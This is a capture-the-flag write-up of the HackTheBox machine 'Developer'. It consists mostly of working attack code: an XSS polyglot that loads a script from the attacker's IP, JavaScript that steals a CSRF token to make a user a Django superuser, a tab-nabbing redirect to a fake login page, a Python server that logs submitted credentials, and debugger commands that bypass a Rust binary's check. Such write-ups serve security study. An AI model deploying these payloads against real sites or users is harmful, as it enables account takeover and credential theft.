---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/iSADo2TqbOs/0.jpg
layout: post
media_subpath: /assets/posts/2022-01-15-xss-tab-nabbing-rust-reversing-developer-hackthebox
tags:
- reversing
- rust
- sentry
- tab nabbing
- xss
title: XSS, Tab Nabbing & Rust Reversing – Developer @ HackTheBox
---

We are going to solve Developer, a pretty hard Linux machine on HackTheBox. It involves Cross-Site-Scripting, Tab Nabbing & reversing a rust binary.

{% youtube iSADo2TqbOs %}

## XSS

**Trigger**

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=document.write('<script src=http://10.10.14.27/payload.js></script>') )//
```

**Promote User to Admin**

```js
xhr = new XMLHttpRequest();

xhr.onload = function() {
  var x = new XMLHttpRequest();
  var r = xhr.response;
  var csrftoken2 = xhr.responseText.replace(/[\r\n]/g, ' ').match(/value="\w+"/)[0];
  csrftoken2 = csrftoken2.substring(7,csrftoken2.length-1);
  console.log(csrftoken2);

  var uri ="http://developer.htb/admin/auth/user/8/change/";
  x = new XMLHttpRequest();
  x.open("POST", uri, true);
  x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  x.send("csrfmiddlewaretoken="+csrftoken2+"&username=xctde&first_name=changed&last_name=&email=&is_active=on&is_staff=on&is_superuser=on&last_login_0=&last_login_1=&date_joined_0=2021-08-21&date_joined_1=22%3A01%3A19&initial-date_joined_0=2021-08-21&initial-date_joined_1=22%3A01%3A19&_save=Save");
}
xhr.open("GET", 'http://developer.htb/admin/auth/user/8/change');
xhr.send(null);
```

## Tab Nabbing

**HTML Payload**

```html
<html>
 <body>
  <script>
  if (window.opener) window.opener.parent.location.replace('http://10.10.14.27/accounts/login/');
  if (window.parent != window) window.parent.location.replace('http://10.10.27/accounts/login/');
  </script>
 </body>
</html>
```

**Python Server**

```python
#!/usr/bin/env python3

import http.server as SimpleHTTPServer
import socketserver as SocketServer

class StoppableHTTPServer(SimpleHTTPServer.HTTPServer):
    def run(self):
        try:
            self.serve_forever()
        except KeyboardInterrupt:
            pass
        finally:
            self.server_close()

class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    def do_GET(self):
        print(self.headers)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        print(self.headers)
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data)

server = StoppableHTTPServer(("", 80), CustomHandler)
server.run()
```

## Debugging

**Commands & Breakpoints**

```
# Breakpoints
break *'authentication::main'+0x103
break *'authentication::main'+0x21E

# Flip Zero Flag
set $ZF = 6 
set $eflags |= (1 << $ZF)

# Zero Byte Fill Memory Area
call memcpy(0x5555555b5a10 , "\x00", 32)

# Crypto / Registers
pwndbg> p/x $xmm0.uint128
$15 = 0x23205cfc58fd8078ca976a80f0251bfe
pwndbg> p/x $xmm1.uint128
$16 = 0x2c15279f3aafc0ebfab502e5d0dba26c
pwndbg> p/x $xmm2.uint128
$17 = 0x635928952a88e31d99e505c684566eac 
pwndbg> p/x $xmm0.uint128
$18 = 0x52f16ad0a9c63289fc56d89b5adc728 
```

**XOR & Endianess**

[Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'635928952a88e31d99e505c684566eac052f16ad0a9d80999fc56d89b5adc728'%7D,'Standard',false)Swap_endianness('Raw',16,true)&input=MjMyMDVjZmM1OGZkODA3OGNhOTc2YTgwZjAyNTFiZmUyYzE1Mjc5ZjNhYWZjMGViZmFiNTAyZTVkMGRiYTI2Yw)
